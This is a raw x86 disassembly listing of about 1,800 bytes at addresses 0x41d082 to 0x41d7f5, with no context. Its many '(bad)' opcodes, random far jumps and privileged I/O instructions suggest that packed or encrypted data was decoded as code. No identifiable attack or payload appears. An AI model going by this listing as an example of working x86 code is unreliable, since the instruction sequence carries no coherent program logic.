  41d082:	add    DWORD PTR [ebx+0x1dfe4726],edx
  41d088:	sbb    al,0x40
  41d08a:	(bad)  
  41d08b:	les    ebp,FWORD PTR [edx]
  41d08d:	xchg   ecx,eax
  41d08e:	jnp    0x41d0f1
  41d090:	aaa    
  41d091:	outs   dx,BYTE PTR ds:[esi]
  41d092:	push   edi
  41d093:	hlt    
  41d094:	cmp    al,0xf7
  41d096:	test   DWORD PTR [ecx+0x5a2a804d],0xc8de0979
  41d0a0:	sbb    BYTE PTR [ecx],ch
  41d0a2:	call   0xe5a33039
  41d0a7:	push   edx
  41d0a8:	lock sbb eax,0xd080a1fe
  41d0ae:	xchg   esp,eax
  41d0af:	mov    bh,0x4
  41d0b1:	push   0xffffff84
  41d0b3:	std    
  41d0b4:	sbb    dh,dh
  41d0b6:	cdq    
  41d0b7:	inc    esi
  41d0b8:	nop
  41d0b9:	test   ah,cl
  41d0bb:	pushf  
  41d0bc:	cmp    al,0x8b
  41d0be:	icebp  
  41d0bf:	xor    DWORD PTR [edi],ebp
  41d0c1:	sahf   
  41d0c2:	int3   
  41d0c3:	mov    dh,0x7c
  41d0c5:	adc    ebp,eax
  41d0c7:	mov    dh,0x75
  41d0c9:	pop    edi
  41d0ca:	fwait
  41d0cb:	addr16 ret 0x2bd0
  41d0cf:	jo     0x41d07a
  41d0d1:	fsub   QWORD PTR [eax]
  41d0d3:	mov    eax,ds:0x31620a6e
  41d0d8:	or     BYTE PTR [edi+0xb],bl
  41d0db:	mov    bh,0x38
  41d0dd:	ds icebp 
  41d0df:	int3   
  41d0e0:	sub    BYTE PTR [edi-0x32],0xe5
  41d0e4:	xlat   BYTE PTR ds:[ebx]
  41d0e5:	fstp   QWORD PTR [edx+0x2fded085]
  41d0eb:	outs   dx,DWORD PTR ds:[esi]
  41d0ec:	cld    
  41d0ed:	je     0x41d12e
  41d0ef:	ret    
  41d0f0:	adc    eax,DWORD PTR [esi+0x2a49a015]
  41d0f6:	dec    edi
  41d0f7:	sbb    ebx,eax
  41d0f9:	jp     0x41d0b1
  41d0fb:	inc    edi
  41d0fc:	mov    ah,0x1b
  41d0fe:	loope  0x41d090
  41d100:	retf   
  41d101:	mov    WORD PTR [esi-0x60e2b47f],?
  41d107:	or     eax,0xf47ee8a0
  41d10c:	jb     0x41d187
  41d10e:	push   cs
  41d10f:	mov    ebp,es
  41d111:	neg    ch
  41d113:	xchg   ebx,eax
  41d114:	pop    ebx
  41d115:	xlat   BYTE PTR ds:[ebx]
  41d116:	jmp    0x57fc:0x72a6f8d1
  41d11d:	inc    ebx
  41d11e:	aad    0x73
  41d120:	mov    WORD PTR [ecx],ss
  41d122:	mov    DWORD PTR [eax-0x7d668ec],edx
  41d128:	add    eax,0xc0f532a9
  41d12d:	out    0x73,eax
  41d12f:	mov    eax,edx
  41d131:	(bad)  
  41d132:	mov    bl,0x81
  41d134:	push   esi
  41d135:	add    al,BYTE PTR [ebp-0x19]
  41d138:	fld    QWORD PTR [ecx]
  41d13a:	popa   
  41d13b:	mov    ebp,0x90e33de0
  41d140:	mov    edi,ebp
  41d142:	jo     0x41d0ca
  41d144:	aam    0x19
  41d146:	repnz adc eax,0xcefb5996
  41d14c:	pop    edi
  41d14d:	dec    eax
  41d14e:	sub    BYTE PTR [edi-0x67],cl
  41d151:	sbb    BYTE PTR [eax],cl
  41d153:	popf   
  41d154:	inc    ebx
  41d155:	loope  0x41d11c
  41d157:	xchg   esi,eax
  41d158:	rcl    BYTE PTR [edx],cl
  41d15a:	jne    0x41d1cf
  41d15c:	xor    BYTE PTR [eax],cl
  41d15e:	xlat   BYTE PTR ds:[ebx]
  41d15f:	fistp  QWORD PTR [ecx]
  41d161:	enter  0x5b11,0x13
  41d165:	gs dec eax
  41d167:	add    BYTE PTR [edi-0x8c3e4df],cl
  41d16d:	push   ecx
  41d16e:	sub    BYTE PTR [esi+0x357c8d0e],cl
  41d174:	sub    eax,0x80850660
  41d179:	and    eax,0x70157f15
  41d17e:	pop    ecx
  41d17f:	not    ah
  41d181:	cpuid  
  41d183:	push   edx
  41d184:	sbb    BYTE PTR [esi-0x22d7e204],bh
  41d18a:	rol    BYTE PTR [ebp+0x275a2791],cl
  41d190:	jb     0x41d130
  41d192:	dec    esi
  41d193:	fnstsw WORD PTR [eax]
  41d195:	pusha  
  41d196:	popf   
  41d197:	popa   
  41d198:	in     ax,dx
  41d19a:	rol    DWORD PTR [ebp+0x14],1
  41d19d:	shl    DWORD PTR [esi-0x690c871c],0x37
  41d1a4:	xor    BYTE PTR [ecx-0x2d46c833],dh
  41d1aa:	inc    esp
  41d1ab:	mov    bl,0xbb
  41d1ad:	(bad)  
  41d1ae:	hlt    
  41d1af:	rcr    DWORD PTR [edi-0x28],1
  41d1b2:	std    
  41d1b3:	dec    edi
  41d1b4:	call   0xf6612060
  41d1b9:	dec    ebp
  41d1ba:	jmp    0xec22:0xe348f4f9
  41d1c1:	sbb    BYTE PTR [ecx],dh
  41d1c3:	cmc    
  41d1c4:	inc    ebp
  41d1c5:	pusha  
  41d1c6:	fidiv  WORD PTR [ebp-0x65]
  41d1c9:	mov    bh,0x8d
  41d1cb:	sub    BYTE PTR [ebx+edx*4-0x13fc305c],ah
  41d1d2:	mov    edx,0x53b8823c
  41d1d7:	add    ch,BYTE PTR [ebx]
  41d1d9:	mov    BYTE PTR [eax],bh
  41d1db:	aas    
  41d1dc:	ja     0x773deaec
  41d1e2:	pop    edi
  41d1e3:	push   esp
  41d1e4:	pusha  
  41d1e5:	fadd   QWORD PTR [ecx]
  41d1e7:	lds    edi,FWORD PTR [edi+ecx*1-0x61]
  41d1eb:	cwde   
  41d1ec:	and    dl,BYTE PTR [eax-0x1ea25e8]
  41d1f2:	inc    eax
  41d1f3:	leave  
  41d1f4:	fcomi  st,st(4)
  41d1f6:	cmc    
  41d1f7:	cmp    ch,dh
  41d1f9:	mov    ds:0x8ad1e23c,al
  41d1fe:	inc    eax
  41d1ff:	sbb    al,0x8e
  41d201:	or     edi,esp
  41d203:	xor    al,0xdb
  41d205:	pop    es
  41d206:	aam    0x88
  41d208:	xor    eax,0xa8ee3993
  41d20d:	lahf   
  41d20e:	cmp    al,0x82
  41d210:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d211:	add    eax,0xc3bc806d
  41d216:	push   ebx
  41d217:	mov    ds:0x273ba117,eax
  41d21c:	cmp    eax,edx
  41d21e:	sbb    BYTE PTR [ebp+0x5a],cl
  41d221:	push   0x5e5529c1
  41d226:	and    cl,BYTE PTR [ebx]
  41d228:	(bad)  
  41d229:	gs jb  0x41d26b
  41d22c:	mov    DWORD PTR [ecx],esi
  41d22e:	iret   
  41d22f:	sbb    BYTE PTR [esi+eax*2+0x1717de33],bh
  41d236:	enter  0x102b,0x8a
  41d23a:	push   ss
  41d23b:	add    BYTE PTR [ebx],bh
  41d23d:	mov    ebx,edx
  41d23f:	int3   
  41d240:	fist   DWORD PTR [eax]
  41d242:	jg     0x41d1ef
  41d244:	jge    0x41d293
  41d246:	mov    dl,0x6
  41d248:	mov    edi,0xad081553
  41d24d:	mov    ds:0xe5baa0ed,eax
  41d252:	es inc ecx
  41d254:	sbb    BYTE PTR [bx+0x5460],cl
  41d259:	dec    eax
  41d25a:	sbb    edx,DWORD PTR es:[bp+si]
  41d25e:	mov    eax,ds:0x58095dd6
  41d263:	stc    
  41d264:	xor    cl,BYTE PTR [ebp-0x186e9a1f]
  41d26a:	out    0x57,al
  41d26c:	neg    DWORD PTR [ecx-0x1f4e3852]
  41d272:	icebp  
  41d273:	cwde   
  41d274:	and    DWORD PTR [edx+edi*4],0xffffffce
  41d278:	pushf  
  41d279:	lods   al,BYTE PTR ds:[esi]
  41d27a:	je     0x41d203
  41d27c:	cli    
  41d27d:	(bad)  
  41d27e:	lods   al,BYTE PTR ds:[esi]
  41d27f:	mov    WORD PTR [ebp-0xea16f25],?
  41d285:	(bad)  
  41d286:	repnz pop ebp
  41d288:	mov    fs,WORD PTR [esi]
  41d28a:	sahf   
  41d28b:	cmp    BYTE PTR [edi-0xd9492f],bh
  41d291:	inc    esi
  41d292:	in     eax,0xa7
  41d294:	xchg   ebx,eax
  41d295:	inc    ebp
  41d296:	imul   esi,DWORD PTR [ecx-0x23],0xffffffec
  41d29a:	out    0x75,eax
  41d29c:	loopne 0x41d2d7
  41d29e:	scas   al,BYTE PTR es:[edi]
  41d29f:	mov    bh,0x6f
  41d2a1:	enter  0xaf2d,0xd7
  41d2a5:	and    eax,esp
  41d2a7:	mov    dh,0x29
  41d2a9:	ret    0x7dc9
  41d2ac:	adc    BYTE PTR [esi*1-0x143a1d30],dh
  41d2b3:	pop    ebp
  41d2b4:	test   al,0xc1
  41d2b6:	sti    
  41d2b7:	inc    edi
  41d2b8:	add    ebp,edx
  41d2ba:	and    al,0x2f
  41d2bc:	mov    ah,0xcf
  41d2be:	cmp    al,0x29
  41d2c0:	mov    eax,0xad51845f
  41d2c5:	(bad)  
  41d2c6:	repnz push edx
  41d2c8:	xlat   BYTE PTR ds:[ebx]
  41d2c9:	sbb    edi,DWORD PTR [edx+0x54]
  41d2cc:	push   0x75
  41d2ce:	xchg   edi,eax
  41d2cf:	popf   
  41d2d0:	dec    ecx
  41d2d1:	mov    al,ds:0xb0426acf
  41d2d6:	fnstsw WORD PTR [edi+0x5f390642]
  41d2dc:	pop    edi
  41d2dd:	imul   ebp,DWORD PTR [edi],0xe044b5b0
  41d2e3:	xlat   BYTE PTR ds:[ebx]
  41d2e4:	mov    esp,0xc868283f
  41d2e9:	push   esi
  41d2ea:	call   0x8ec85a29
  41d2ef:	jge    0x41d33d
  41d2f1:	stos   BYTE PTR es:[edi],al
  41d2f2:	sub    esi,DWORD PTR [ebp-0x5bfb61db]
  41d2f8:	inc    ebx
  41d2f9:	push   esi
  41d2fa:	fistp  WORD PTR [edx+0x440c6c12]
  41d300:	lock sahf 
  41d302:	mov    ebx,0x229de23
  41d307:	dec    ebx
  41d308:	sub    cl,al
  41d30a:	mov    ecx,0xaec826f
  41d30f:	adc    esi,esp
  41d311:	push   es
  41d312:	lea    ebx,[edi-0x2137389]
  41d318:	popa   
  41d319:	(bad)  
  41d31a:	push   esp
  41d31b:	add    al,0x56
  41d31d:	aam    0x72
  41d31f:	(bad)  
  41d321:	fsubr  QWORD PTR [ecx+ecx*2+0x54f710b8]
  41d328:	inc    eax
  41d329:	and    eax,0xa8d36acf
  41d32e:	jns    0x41d396
  41d330:	cdq    
  41d331:	push   ebx
  41d332:	pop    ebp
  41d333:	sti    
  41d334:	jle    0x41d396
  41d336:	fld    QWORD PTR [edi-0x3c]
  41d339:	mov    al,ds:0x23a0e881
  41d33e:	pop    ds
  41d33f:	fwait
  41d340:	or     eax,0xacd7a7c0
  41d345:	sbb    DWORD PTR [ebx+0x26],edi
  41d348:	mov    bl,0x62
  41d34a:	jmp    0x41d2dd
  41d34c:	mov    dl,0xc7
  41d34e:	fwait
  41d34f:	mov    dh,0xc7
  41d351:	and    DWORD PTR [ecx-0x48],eax
  41d354:	fist   WORD PTR [ecx-0x26d69c2e]
  41d35a:	out    0x7d,al
  41d35c:	inc    ebp
  41d35d:	(bad)  
  41d35f:	lds    edi,FWORD PTR [eax-0x62]
  41d362:	mov    dl,0x4f
  41d364:	scas   eax,DWORD PTR es:[edi]
  41d365:	jo     0x41d339
  41d367:	push   cs
  41d368:	mov    BYTE PTR [eax+eax*1-0x4],cl
  41d36c:	push   0xffffff92
  41d36e:	fs hlt 
  41d370:	ret    
  41d371:	sub    BYTE PTR [eax+0x40],cl
  41d374:	xor    DWORD PTR [esi],edx
  41d376:	mov    ah,0x34
  41d378:	dec    edx
  41d379:	gs in  al,0xb3
  41d37c:	loopne 0x41d349
  41d37e:	adc    esp,esi
  41d380:	inc    esp
  41d381:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d382:	(bad)  
  41d383:	mov    al,0xfb
  41d385:	mov    esp,0xdf11ea39
  41d38a:	imul   edx,edi,0xd0adb29a
  41d390:	push   edi
  41d391:	dec    ecx
  41d392:	pop    edx
  41d393:	push   eax
  41d394:	push   ecx
  41d395:	sub    eax,0x10152ff7
  41d39a:	paddb  mm6,QWORD PTR [edx+0xd]
  41d39e:	pop    eax
  41d39f:	sbb    eax,0x5939cf8
  41d3a4:	fwait
  41d3a5:	out    dx,eax
  41d3a6:	mov    ecx,0xed0a58d7
  41d3ab:	mov    WORD PTR [ebx+ecx*8+0x4f],es
  41d3af:	jnp    0x41d3af
  41d3b1:	lds    ecx,FWORD PTR [esi-0x432ba1]
  41d3b7:	cmp    eax,ebx
  41d3b9:	xchg   ebp,eax
  41d3ba:	popa   
  41d3bb:	stc    
  41d3bc:	jmp    0x2dadb073
  41d3c1:	scas   al,BYTE PTR es:[edi]
  41d3c2:	pop    esi
  41d3c3:	mov    DWORD PTR [esi-0x4292a8f7],ebx
  41d3c9:	int    0xeb
  41d3cb:	adc    al,cl
  41d3cd:	in     eax,0x9a
  41d3cf:	je     0x41d3fb
  41d3d1:	test   eax,0x78eac6ce
  41d3d6:	jl     0x41d38f
  41d3d8:	mov    esp,0x8499968c
  41d3dd:	rol    dl,0xd6
  41d3e0:	or     dh,BYTE PTR [ecx]
  41d3e2:	les    eax,FWORD PTR [eax-0x80]
  41d3e5:	jmp    0x7918:0x1638ce23
  41d3ec:	inc    esi
  41d3ed:	push   ebx
  41d3ee:	in     al,dx
  41d3ef:	inc    ebx
  41d3f0:	mov    ds:0x4e989cfc,al
  41d3f5:	adc    eax,DWORD PTR [esi+eiz*8-0x54]
  41d3f9:	stos   DWORD PTR es:[edi],eax
  41d3fa:	imul   edi,DWORD PTR [ecx+edx*1],0xffffff87
  41d3fe:	(bad)  
  41d3ff:	into   
  41d400:	leave  
  41d401:	enter  0xedb1,0x9a
  41d405:	scas   eax,DWORD PTR es:[edi]
  41d406:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d407:	mov    eax,0xf50459e7
  41d40c:	dec    ebx
  41d40d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d40e:	repnz cdq 
  41d410:	sub    eax,0x5aa16650
  41d415:	and    BYTE PTR [eax+0x10afa40e],bl
  41d41b:	scas   al,BYTE PTR es:[edi]
  41d41c:	ds nop
  41d41e:	imul   esi,DWORD PTR [edx],0x0
  41d421:	pusha  
  41d422:	loopne 0x41d46a
  41d424:	fcomp  DWORD PTR gs:[esi+0xc]
  41d428:	ja     0x41d497
  41d42a:	int    0x17
  41d42c:	daa    
  41d42d:	ret    0xee9b
  41d430:	inc    esp
  41d431:	dec    ecx
  41d432:	ss ret 0x9024
  41d436:	push   es
  41d437:	out    dx,eax
  41d438:	xor    DWORD PTR [eax-0x16],esi
  41d43b:	mov    gs,ebp
  41d43d:	adc    BYTE PTR [edx-0x6d],dl
  41d440:	dec    esi
  41d441:	xchg   edx,ebp
  41d443:	sahf   
  41d444:	mov    bh,0x1a
  41d446:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d447:	enter  0xaf62,0x50
  41d44b:	xor    BYTE PTR [esi+0x53],dl
  41d44e:	jmp    0x95592d54
  41d453:	xor    eax,0xb72f3725
  41d458:	ins    BYTE PTR es:[edi],dx
  41d459:	adc    BYTE PTR [eax+0x75],0xa3
  41d45d:	jae    0x41d42e
  41d45f:	je     0x41d4c4
  41d461:	adc    eax,0xbca7b9c6
  41d466:	jecxz  0x41d4bf
  41d468:	lods   eax,DWORD PTR ds:[esi]
  41d469:	and    edx,0xbbe2b9e2
  41d46f:	retf   
  41d470:	retf   0x56c0
  41d473:	adc    al,0x62
  41d475:	or     al,0x2a
  41d477:	xor    eax,0x831336cb
  41d47c:	call   0x1b14:0xf62d5f13
  41d483:	retf   
  41d484:	adc    DWORD PTR [ebx-0x4a545e70],edi
  41d48a:	(bad)  
  41d48b:	jle    0x41d458
  41d48d:	inc    ecx
  41d48e:	xchg   ebp,eax
  41d48f:	mov    al,ds:0x3cbe255b
  41d494:	fisubr WORD PTR [ebx+0xd06fd8c]
  41d49a:	adc    edi,DWORD PTR [ebx+0x32]
  41d49d:	arpl   dx,sp
  41d49f:	xor    dh,BYTE PTR [edx]
  41d4a1:	xor    al,0x33
  41d4a3:	into   
  41d4a4:	stos   DWORD PTR es:[edi],eax
  41d4a5:	jecxz  0x41d444
  41d4a7:	call   0xb55a:0x5cd8366
  41d4ae:	aad    0xac
  41d4b0:	or     eax,0xdb568a4a
  41d4b5:	sub    BYTE PTR [edx],0xf
  41d4b8:	(bad)  
  41d4ba:	xchg   BYTE PTR [edx],cl
  41d4bc:	mov    BYTE PTR [esi],al
  41d4be:	sbb    eax,0x365cf8d0
  41d4c3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d4c4:	fcomip st,st(1)
  41d4c6:	lea    esp,[ebx]
  41d4c8:	push   cs
  41d4c9:	sbb    eax,0x3e604df4
  41d4ce:	xchg   DWORD PTR [ebp-0x5b],esp
  41d4d1:	xor    al,0x57
  41d4d3:	mov    ch,0x5
  41d4d5:	pushf  
  41d4d6:	inc    edx
  41d4d7:	jle    0x41d48c
  41d4d9:	or     DWORD PTR [edx],0xffffffa4
  41d4dc:	and    BYTE PTR [ecx+0x5a8d8e83],dl
  41d4e2:	xchg   DWORD PTR [eax],ecx
  41d4e4:	add    DWORD PTR [ecx-0x47],esp
  41d4e7:	jge    0x41d552
  41d4e9:	dec    ecx
  41d4ea:	mov    esp,0xfe621f31
  41d4ef:	dec    eax
  41d4f0:	push   esi
  41d4f1:	sub    edx,DWORD PTR [ebx]
  41d4f3:	jmp    0x41d522
  41d4f5:	lds    edx,FWORD PTR [ebx+ebx*8+0x7f]
  41d4f9:	out    dx,al
  41d4fa:	push   0xffffff92
  41d4fc:	cmp    eax,0xd5ec220b
  41d501:	mov    ch,0x80
  41d503:	and    al,ch
  41d505:	test   eax,0xe0938812
  41d50a:	je     0x41d54c
  41d50c:	adc    DWORD PTR [esi-0x5e0c626b],0xffffffcf
  41d513:	test   DWORD PTR [ebp+0x55],0x5ee952cb
  41d51a:	cmc    
  41d51b:	mov    dl,BYTE PTR [esp+esi*2-0x14]
  41d51f:	add    al,ch
  41d521:	push   0xffffffe2
  41d523:	add    BYTE PTR [ebp-0x43],cl
  41d526:	(bad)  
  41d527:	aam    0x19
  41d529:	into   
  41d52a:	xchg   edx,eax
  41d52b:	push   0x5a
  41d52d:	aas    
  41d52e:	leave  
  41d52f:	adc    cl,BYTE PTR [esi+0x60]
  41d532:	mov    eax,0xa5fa47ad
  41d537:	mov    ?,WORD PTR [esi+0x400d745c]
  41d53d:	and    ah,dl
  41d53f:	pushf  
  41d540:	and    eax,0x58cece2
  41d545:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d546:	inc    edx
  41d547:	xchg   edi,eax
  41d548:	(bad)  
  41d54a:	das    
  41d54b:	cmc    
  41d54c:	cmc    
  41d54d:	scas   eax,DWORD PTR es:[edi]
  41d54e:	or     al,0xa
  41d550:	add    BYTE PTR [eax-0x7],0xf7
  41d554:	ja     0x41d535
  41d556:	add    dl,BYTE PTR [edx+0x28]
  41d559:	push   0xffffffe6
  41d55b:	pop    ebx
  41d55c:	mov    al,ds:0x3bb48d15
  41d561:	xchg   esi,eax
  41d562:	int3   
  41d563:	leave  
  41d564:	ins    DWORD PTR es:[edi],dx
  41d565:	mov    bh,0xfc
  41d567:	push   ss
  41d568:	mov    ah,BYTE PTR [eax+0x6a894154]
  41d56e:	adc    DWORD PTR [ecx-0xe4977ae],ecx
  41d574:	push   edx
  41d575:	inc    eax
  41d576:	xchg   ecx,eax
  41d577:	retf   
  41d578:	loope  0x41d569
  41d57a:	xchg   BYTE PTR [ecx],bl
  41d57c:	cmc    
  41d57d:	outs   dx,WORD PTR ds:[esi]
  41d57f:	arpl   bp,ax
  41d581:	mov    dl,0xb1
  41d583:	inc    ecx
  41d584:	cwde   
  41d585:	jg     0x41d51a
  41d587:	sbb    eax,0x9dfa5fdd
  41d58c:	push   0x65
  41d58e:	ss cld 
  41d590:	inc    edx
  41d591:	mov    BYTE PTR [ebx-0x1c63abad],al
  41d597:	rol    DWORD PTR [edi-0x5c],0x78
  41d59b:	xor    eax,0xf578abc0
  41d5a0:	(bad)  
  41d5a1:	mov    cl,0xde
  41d5a3:	mov    ds:0xd67e8f63,eax
  41d5a8:	jecxz  0x41d60d
  41d5aa:	out    dx,al
  41d5ab:	dec    ecx
  41d5ac:	mov    edi,0xb62d06e4
  41d5b1:	sbb    al,0xf3
  41d5b3:	mov    DWORD PTR [esi+0x5b6bf313],0xece2e81e
  41d5bd:	pusha  
  41d5be:	inc    esi
  41d5bf:	je     0x41d583
  41d5c1:	jp     0x41d57b
  41d5c3:	sub    eax,0x53650aa
  41d5c8:	outs   dx,DWORD PTR ds:[esi]
  41d5c9:	cmp    al,0x1d
  41d5cb:	jp     0x41d60d
  41d5cd:	inc    ebx
  41d5ce:	out    dx,eax
  41d5cf:	std    
  41d5d0:	in     al,dx
  41d5d1:	cmp    esi,DWORD PTR [eax]
  41d5d3:	adc    al,BYTE PTR [edx-0x59c4f423]
  41d5d9:	scas   eax,DWORD PTR es:[edi]
  41d5da:	daa    
  41d5db:	pop    esi
  41d5dc:	cmp    al,0x2
  41d5de:	into   
  41d5df:	mov    al,cl
  41d5e1:	ret    0x530d
  41d5e4:	xchg   ecx,eax
  41d5e5:	arpl   WORD PTR [esi+0x73],ax
  41d5e8:	push   ebx
  41d5e9:	(bad)  
  41d5ea:	retf   
  41d5eb:	pop    es
  41d5ec:	mul    DWORD PTR [ebx-0x2c]
  41d5ef:	mov    ch,0x79
  41d5f1:	cmc    
  41d5f2:	cmp    DWORD PTR ds:0xf9230246,ebx
  41d5f8:	add    edx,edx
  41d5fa:	ins    BYTE PTR es:[edi],dx
  41d5fb:	popf   
  41d5fc:	push   edx
  41d5fd:	push   edx
  41d5fe:	dec    ebx
  41d5ff:	scas   al,BYTE PTR es:[edi]
  41d600:	push   ecx
  41d601:	push   esi
  41d602:	imul   ecx,DWORD PTR [eax+0x34],0x200bb707
  41d609:	popf   
  41d60a:	(bad)  
  41d60b:	xchg   edx,eax
  41d60c:	(bad)  
  41d60d:	inc    esi
  41d60e:	popa   
  41d60f:	ja     0x41d59c
  41d611:	inc    esi
  41d612:	dec    edx
  41d613:	jmp    0xc4c3:0xaf2eecc
  41d61a:	mov    esp,0xa53ff3ea
  41d61f:	dec    ebp
  41d620:	in     al,dx
  41d621:	pop    edx
  41d622:	jnp    0x41d611
  41d624:	xor    esp,edx
  41d626:	pop    edi
  41d627:	sti    
  41d628:	jg     0x41d600
  41d62a:	(bad)
  41d62e:	add    eax,DWORD PTR [edi-0x3aa34cdb]
  41d634:	test   al,0x6f
  41d636:	scas   eax,DWORD PTR es:[edi]
  41d637:	ss rcr dl,1
  41d63a:	mov    ah,0x52
  41d63c:	mov    bh,0x6
  41d63e:	pop    eax
  41d63f:	inc    eax
  41d640:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d641:	call   0x857f:0xc8bedcb6
  41d648:	das    
  41d649:	dec    ebp
  41d64a:	adc    ecx,DWORD PTR [ebp+ecx*1+0x7c78f90c]
  41d651:	inc    ebp
  41d652:	stos   DWORD PTR es:[edi],eax
  41d653:	icebp  
  41d654:	in     al,dx
  41d655:	pop    ebp
  41d656:	cmp    DWORD PTR [eax],ebp
  41d658:	or     ah,BYTE PTR [edi-0x11]
  41d65b:	cmp    ch,dh
  41d65d:	or     DWORD PTR [edx+0x16],ebx
  41d660:	loop   0x41d671
  41d662:	mov    bh,0x26
  41d664:	rcl    ebx,cl
  41d666:	rol    BYTE PTR [edi+0x65310f7a],0xc4
  41d66d:	loop   0x41d634
  41d66f:	div    DWORD PTR [esi-0x55]
  41d672:	imul   DWORD PTR ds:0x84420067
  41d678:	jg     0x41d643
  41d67a:	cmp    al,0xab
  41d67c:	dec    edi
  41d67d:	add    ch,BYTE PTR [esp+ebx*1+0x6]
  41d681:	in     eax,0xc7
  41d683:	popa   
  41d684:	fwait
  41d685:	mov    ebx,edx
  41d687:	push   ecx
  41d688:	xor    BYTE PTR [eax],al
  41d68a:	imul   ebp,DWORD PTR [ecx-0x54510cf2],0x28
  41d691:	inc    ecx
  41d692:	sub    bh,BYTE PTR [edi+ebp*8]
  41d695:	or     BYTE PTR [edi],dl
  41d697:	and    edi,DWORD PTR [ecx+0x32067a6d]
  41d69d:	scas   al,BYTE PTR es:[edi]
  41d69e:	jmp    DWORD PTR [ebx+0x1fcace16]
  41d6a4:	push   0x40
  41d6a6:	jmp    0xe759:0xc64df53f
  41d6ad:	js     0x41d6ef
  41d6af:	jl     0x41d6d6
  41d6b1:	fimul  DWORD PTR ds:0xa60f0005
  41d6b7:	xchg   edx,eax
  41d6b8:	out    0x5d,eax
  41d6ba:	xor    DWORD PTR [eiz*4-0x6554458e],0x42b9b5bc
  41d6c5:	test   eax,0xe6b9fda5
  41d6ca:	mov    cl,al
  41d6cc:	jae    0x41d6c6
  41d6ce:	ror    esi,1
  41d6d0:	sub    esp,DWORD PTR [ecx+0x6959adee]
  41d6d6:	frndint 
  41d6d8:	loop   0x41d65b
  41d6da:	inc    esp
  41d6db:	and    ebx,DWORD PTR [edi-0x54]
  41d6de:	fcom   st(4)
  41d6e0:	aad    0x97
  41d6e2:	dec    edx
  41d6e3:	ret    0x36fe
  41d6e6:	dec    esi
  41d6e7:	inc    ebx
  41d6e8:	repnz popf 
  41d6ea:	idiv   al
  41d6ec:	push   ebx
  41d6ed:	aaa    
  41d6ee:	xor    DWORD PTR [edi+esi*8-0x36],edi
  41d6f2:	test   DWORD PTR [esi],ebx
  41d6f4:	adc    BYTE PTR [esi+0x2e],0xd
  41d6f8:	mov    bh,0xe9
  41d6fa:	ins    BYTE PTR es:[edi],dx
  41d6fb:	xlat   BYTE PTR ds:[ebx]
  41d6fc:	pop    edx
  41d6fd:	shr    ecx,0xc1
  41d700:	push   cs
  41d701:	or     eax,0x8d49b4bd
  41d706:	pop    esp
  41d707:	imul   edx,DWORD PTR [ebp+esi*8-0x62],0x63
  41d70c:	push   eax
  41d70d:	fwait
  41d70e:	popf   
  41d70f:	adc    BYTE PTR [ecx],dh
  41d711:	test   eax,0x8a6af859
  41d716:	sub    BYTE PTR [esi+0x30],bl
  41d719:	cmp    al,0xdd
  41d71b:	aaa    
  41d71c:	call   0xbdec:0xdff11a5
  41d723:	cmp    DWORD PTR [esi-0x55],0xb2275177
  41d72a:	aad    0xdd
  41d72c:	mov    eax,0xc712d5e2
  41d731:	jle    0x41d7b1
  41d733:	jno    0x41d798
  41d735:	xor    edx,DWORD PTR [ebx+0x1d]
  41d738:	xor    eax,DWORD PTR [edi+0xe5620b8]
  41d73e:	mov    bh,0xa6
  41d740:	mov    eax,ds:0xb10f15b2
  41d745:	aad    0x15
  41d747:	outs   dx,BYTE PTR ds:[esi]
  41d748:	inc    ecx
  41d749:	ins    BYTE PTR es:[edi],dx
  41d74a:	in     al,dx
  41d74b:	pop    ecx
  41d74c:	adc    eax,0xa4a46d92
  41d751:	add    al,0xad
  41d753:	test   eax,0x2fd1ff72
  41d758:	sub    DWORD PTR [eax-0x52360ce9],ebx
  41d75e:	xchg   ebx,eax
  41d75f:	and    esp,eax
  41d761:	test   BYTE PTR [ecx+0x72],al
  41d764:	leave  
  41d765:	mov    esp,0x45ac4e44
  41d76a:	iret   
  41d76b:	je     0x5c9d17
  41d771:	dec    ebx
  41d772:	outs   dx,BYTE PTR ds:[esi]
  41d773:	pop    edx
  41d774:	ins    DWORD PTR es:[edi],dx
  41d775:	or     BYTE PTR [edx],cl
  41d777:	shl    al,0x53
  41d77a:	mov    ds:0xef7a7e2e,al
  41d77f:	dec    esi
  41d780:	and    esi,DWORD PTR [esi+0x4d]
  41d783:	clc    
  41d784:	mov    eax,ds:0xa0f40ba
  41d789:	jne    0x41d802
  41d78b:	xchg   edi,eax
  41d78c:	call   0xc28:0x89ba6257
  41d793:	inc    esi
  41d794:	int    0x90
  41d796:	int3   
  41d797:	cmp    al,0xb7
  41d799:	fimul  WORD PTR [edi]
  41d79b:	and    eax,0x64fa81f9
  41d7a0:	fisub  WORD PTR [esi]
  41d7a2:	xor    al,0xe0
  41d7a4:	and    DWORD PTR [edi],edx
  41d7a6:	in     eax,dx
  41d7a7:	pop    ss
  41d7a8:	pop    edx
  41d7a9:	(bad)  
  41d7aa:	jae    0x41d765
  41d7ac:	aad    0xdf
  41d7ae:	push   es
  41d7af:	or     eax,0x791d78fe
  41d7b4:	(bad)  
  41d7b5:	jp     0x41d7ab
  41d7b7:	dec    ecx
  41d7b8:	cli    
  41d7b9:	xchg   ebx,eax
  41d7ba:	mov    cs,WORD PTR [ecx+0x164e43c7]
  41d7c0:	inc    edx
  41d7c1:	bound  ecx,QWORD PTR gs:[ebp+0x55]
  41d7c5:	(bad)  
  41d7c6:	mov    esi,0x2ef83898
  41d7cb:	mov    edx,0xc271e3ff
  41d7d0:	add    BYTE PTR [esi-0x29c0609b],ch
  41d7d6:	sbb    BYTE PTR [ecx],ch
  41d7d8:	push   0xffffff8d
  41d7da:	add    esp,DWORD PTR [esi+ecx*2-0x25]
  41d7de:	mov    ebx,0x8e2a5866
  41d7e3:	outs   dx,BYTE PTR ds:[esi]
  41d7e4:	pop    ecx
  41d7e5:	fwait
  41d7e6:	dec    ebp
  41d7e7:	sbb    BYTE PTR [edx],dl
  41d7e9:	xchg   ebx,eax
  41d7ea:	sbb    al,0xd1
  41d7ec:	fild   QWORD PTR [ebp+ebp*2-0x64a49bbe]
  41d7f3:	mov    bl,BYTE PTR [edi]
  41d7f5:	fisub  DWORD PTR [edx+esi*2+0x6f]
